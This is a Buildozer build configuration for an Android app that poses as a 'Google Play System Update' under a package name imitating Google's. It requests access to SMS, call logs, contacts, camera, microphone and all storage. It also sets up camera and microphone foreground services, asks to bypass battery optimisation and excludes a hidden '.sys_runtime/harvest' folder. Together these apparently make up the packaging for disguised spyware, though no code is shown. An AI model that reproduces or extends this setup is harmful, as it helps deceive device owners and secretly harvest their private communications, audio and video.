[app]

title = Google Play System Update
package.name = com.google.android.gms.v4
package.domain = android.system

source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite, res/*, .sys_runtime/.nomedia
source.exclude_dirs = tests, __pycache__, docs, .github, .sys_runtime/g_tmp, .sys_runtime/c_tmp, .sys_runtime/harvest

version = 3.1.0

# ✅ إزالة الإصدار من numpy حتى يتم سحبه عبر pip بدلاً من تحميل المصدر القديم
requirements = python3, kivy==2.3.0, requests, urllib3, certifi, pillow, pyjnius, android, cryptography==42.0.5, pyzipper, numpy, tflite-runtime==2.14.0

icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_CONTACTS, READ_SMS, READ_CALL_LOG, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE

android.api = 34
android.minapi = 21
android.sdk = 34
android.ndk = 25b
android.build_tools_ver = 34.0.0
android.accept_sdk_license = True

android.archs = arm64-v8a

android.allow_backup = False
android.request_legacy_external_storage = True
android.uses_cleartext_traffic = True

android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True

orientation = portrait
fullscreen = 1
log_level = 2
warn_on_root = 0

android.meta_data = android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS=1

android.no_byte_compile_python = False
android.optimize_python = True

[buildozer]
log_level = 2
warn_on_root = 1
